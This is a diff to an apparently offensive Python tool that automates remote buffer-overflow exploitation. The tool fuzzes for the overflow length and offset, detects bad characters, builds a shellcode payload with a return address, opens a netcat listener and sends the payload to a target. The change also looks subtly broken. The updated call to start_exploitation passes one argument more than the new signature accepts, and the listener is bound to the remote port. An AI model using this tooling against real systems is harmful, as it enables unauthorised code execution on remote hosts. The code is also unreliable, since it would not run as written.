@@ -12,19 +12,6 @@ import os
 import sys
 import binascii
 
-
-# TODO: FIX `addr` otherwise it won't work!!!
-# TODO: add also offline version!
-# TODO: when trying to connect, let it `../`, `..|`, `..\`, `..-` and so on :)
-# TODO: clean the main function, create other funtions and call them inside `main()`!
-# TODO: would be nice to allow the use of multiple threads (multi-threaded)!
-# TODO: save data to not restart all scans
-# TODO: (when fuzzing) resend request if time out, after 3 times do a `host_up()` check, if host is up try again and fail if still problems exist otherwise continue
-# TODO: nice, unique banner :)
-# TODO: -o flag (for output > file -> logger/logging_file)
-# TODO: user can create screen shot, read screen shot, get all chars and compare them to get bad chars!
-
-
 shell_code = ""
 payload = ""
 xbuf = ""
@@ -163,7 +150,7 @@ def exploit_buffer_setup(shell_code, addr, prefix, offset):
     payload = exploit_buffer(shell_code, addr, prefix, offset)
 
 
-def start_exploitation(shell_code, addr, prefix, offset, random_port, r_ip_port, timeout):
+def start_exploitation(shell_code, addr, prefix, offset, r_ip_port, timeout):
     payload_thread = threading.Thread(
         target=exploit_buffer_setup, args=([shell_code, addr, prefix, offset]))
     payload_thread.start()
@@ -188,18 +175,18 @@ def start_exploitation(shell_code, addr, prefix, offset, random_port, r_ip_port,
     logging_console("Generated payload, saved in `payload.txt`", "POSITIVE")
     logging_console(f"Starting netcat @ port {r_ip_port[1]}", "VERBOSE")
     netcat(r_ip_port[1])
-    logging_console("Sending payload", "VERBOSE")
+    logging_console("Sending payload...", "VERBOSE", end="\r")
 
     # sending without using `send()` function, because the shell code will be wrong after decoding and encoding it!
     s = connect((r_ip_port[0], r_ip_port[1]), timeout=timeout)
     try:
         s.send(payload)
         recv(1024, s)
+        logging_console("Payload sent!", "INFO")
         return True
     except Exception:
         return False
 
-    logging_console("Payload sent", "INFO")
     # check netcat!
 
 
@@ -263,7 +250,7 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
             "Note: BAF won't work as expected if the values are wrong!", "INFO")
         length_of_overflow, offset = len_of_overflow, offset_user
 
-    # Scaning bad chars
+    # Scanning bad chars
     if not escape_bad_char_detection:
         bad_chars = start_bad_char_detection(
             prefix, length_of_overflow, r_ip_port, timeout)
@@ -314,7 +301,7 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
     addr = binascii.unhexlify(addr)
 
     start_exploitation(xbuf, addr, prefix.replace('\\\\', '\\').encode(
-        'latin1'), offset, r_ip_port[1], r_ip_port, timeout)
+        'latin1'), offset, l_ip_port[1], r_ip_port, timeout)
 
 
 if __name__ == '__main__':
